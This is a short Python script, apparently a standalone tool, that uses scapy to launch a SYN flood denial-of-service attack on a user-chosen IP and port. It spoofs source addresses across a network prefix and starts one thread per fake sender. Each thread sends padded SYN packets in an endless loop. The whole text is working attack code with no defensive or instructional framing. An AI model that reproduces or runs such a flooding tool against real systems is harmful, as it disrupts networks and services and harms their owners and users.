import scapy.all as scapy
from threading import Thread

def SYN_Flooding(srcIP, dstIP, dstPort):
    ip= scapy.IP(src=srcIP ,dst=dstIP)
    tcp = scapy.TCP(sport=scapy.RandShort(), dport=dstPort, flags="S")
    raw = scapy.Raw(b"X"*1024)
    p = ip / tcp / raw
    scapy.send(p, loop=1, verbose=0)

if __name__ == "__main__":
    try:
        perfix_network = input("Enter your prefix network (exa. '10.120.0') : ")
        dstIP = input("Enter your target IP (exa. '10.120.0.190') : ")
        dstPort = int(input("Enter your target Port (exa. '80') : "))
        count_comp = int(input("Enter a number for the number of computers you want to use (1 - 255) : "))
        for i in range(1, count_comp):
            srcIP = f"{perfix_network}.{i}"
            Thread(target=SYN_Flooding, args=(srcIP, dstIP, dstPort)).start()
    except:
        print("Something went wrong")